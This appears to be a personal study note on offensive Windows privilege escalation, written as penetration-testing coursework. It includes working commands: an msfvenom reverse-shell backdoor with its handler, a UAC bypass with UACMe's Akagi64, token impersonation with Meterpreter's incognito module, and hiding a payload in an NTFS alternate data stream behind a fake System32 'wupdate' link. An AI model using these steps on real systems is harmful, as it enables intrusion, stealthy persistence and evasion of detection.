
---

Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
- **User Mode:** Programs and services running in user mode have limited access to system resources and functionality. 
- **Kernel Mode:** Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and systems memory.

Privilege escalation on Windows systems will typically follow the following methodology:
- Identifying kernel vulnerabilities.
- Downloading, compiling and transferring kernel exploits onto the target system.

### Tools and Environment

- **Windows-Exploit-Suggester:** This tool compares a target patch levels against the Microsfot vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Github: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **Windows-Kernel-Exploits:** Collection of Windows Kernel exploits sorted by CVE. Github: https://github.com/SecWiki/windows-kernel-exploits

**We can use a useful MSF module that can suggest to us exploits we can use on our target system: "post/multi/recon/local_exploit_suggester". 
Note: In order to use it, we need to obtain a meterpreter session first on the target**

**If we downloaded a payload file that we want to be executed on the target machine, we can upload it using the meterpreter session:** `meterpreter> upload (path of file on our machine)`

**Note: On Windows machines**, we should only upload exploit files to **Temp directory** to avoid detection from regular users 

---


##  Bypassing UAC With UACMe


User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrator group.

A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.

![[Pasted image 20250205185332.png]]

Attack can bypass UAC in order to execute malicious executable with elevated privileges.

In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrator group on the Windows target system.

UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.

UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.

There are multiple tools and techniques that can be used to bypass UAC. However, the tool and technique used will depend on the version of Windows running on the target system.

We can use UACMe tool from this Github repository: https://github.com/hfiref0x/UACME . This tool works for Windows from 7 to 10.

It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.

**There is a an exploit module in MSF that allows us to have a meterpreter session on a target that runs http: windows/http/rejetto_hfs_exec**

It is a good practice to switch to the explorer.exe process once we have a meterpreter session. This will provide us with stability, stealth and persistence. We do this by: `meterpreter> pgrep explorer` this will give us the process ID of explorer.exe. To switch to the explorer process by:`migrate (PID number)`

To make sure that the current user we logged in as is part of the administrators group, in a shell session, we do: `net localgroup Administrators`

If we see our username in the output, that means we can make changes after passing the UAC. However, we can't do that by using cmd.

In order to use UACMe tool, we will need to upload the compiled code of Akagi64 to the target host in directory Temp that we can create. 

After uploading the tool, we will need to create a backdoor payload to also upload it with it. This payload will allow us to have another meterpreter session on MSF with full privileges. 

To create the payload:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=(our IP address) LPORT=(port number) -f exe > backdoor.exe`

After uploading the payload that we created to directory Temp, we will need to start another MSF session in a new tab and use multi/handler and set the same options we sat for the backdoor payload:
```bash
>msf6 exploit(multi/handler)>set payload windows/meterpreter/reverse_tcp
>set LHOST (our IP address)
>set LPort (port number)
>run 
```

Since this is listening for a connection, we will need to run our payload file with Akagi64.exe.

On the host target, in a shell session:`.\Akagi64.exe 23 C:\Temp\backdoor.exe

After running that, we come back to the MSF that we ran, we will find that we have another meterpreter session into the target host with the same username. However, if we did:`getprivs`. We will have much more privileges than before.  

To list the processes: `ps` We will notice that most of the processes have the user as NT AUTHORITY\SYSTEM.  We can migrate to any of the Authority processes to have a shell session with full privileges. After we migrate to any of the Authority labelled processes, we can get a shell session.    

---

## Access Token Impersonation

Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority subsystem Service (LSASS).

A Windows access token is responsible for identifying the and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.

Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

The following are the privileges that are required for a successful impersonation attack:
- SeAssignPrimaryToken: This allows a user to impersonate tokens.
- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges. 

### The Incognito Module:

Incognito is a built-in meterpreter module that was originally a standalone application that allows us to impersonate user tokens after successful exploitation.
We can use this module to display a list of available tokens we can impersonate.

To use this module, we need to have a meterpreter session on our target host first. Once we have the meterpreter session:`load incognito`. **Note: If the meterpreter session died, start another one and load the module again.** 

We need first to make sure that the module will actually work by checking what privileges we have with our current user:`get privs` . If we see "SeAssignPrimaryToken", and "SeImpersonatePrivilege", we know that the module will probably work. 

After loading the module, we can list the tokens by:`list_tokens -u` This will give us the names of the tokens we can impersonate. All what we have to do now is to copy the name of the token that we wish to impersonate and do the following: `impersonate_token "Name of Token"`

Now we have escalated our privileges. 


---

## Alternate Data Streams (ADS)

ADS is an NTFS (New Technology File System ) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).

Any file created on an NTFS drive wlil have two different forks/streams:
- **Data Stream:** Default stream that contains the data of the file.
- **Resource Stream:** Typically contains the metadata of the file.

Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection.

This can be done by storing the malicious code in the file attribute resource stream (metadata) of a legitimate file. 

This technique is usually used to evade basic signature based AVs and static scanning tools. 

On Windows, we can create a hidden file within a file like so. For example, we want to create a hidden text file called "secret.txt" within another text file called "note.txt": `notepad note.txt:secret.txt` .  This will ask us if we want to create a new file, we click yes. 
Now, we can write what ever we want, save and exit. If we check the file again, we will find that the file is empty with the legit name that we gave it:"note.txt" .

In order to access the hidden file that we created before, we only need to write the same command that we used to create the hidden file. We will see the hidden text we wrote in this hidden file.

Attackers can also create symbolic links in "system32" directory to execute malicious codes easier. For example, we want to hide the content of a malicious file in a text file called "log.txt". To do that: `payload.exe > log.txt:payload.exe` Now, we can enter harmless content in the log.txt file to disguise the file as a legit file and delete the payload.exe file . Next, we will create the symbolic link in "system32" directory: `C:\Windows\System32 > mklink wupdate.exe C:\Temp\log.txe:payload.exe `

Now, when we type:`wupdate` , our malicious code will be executed.

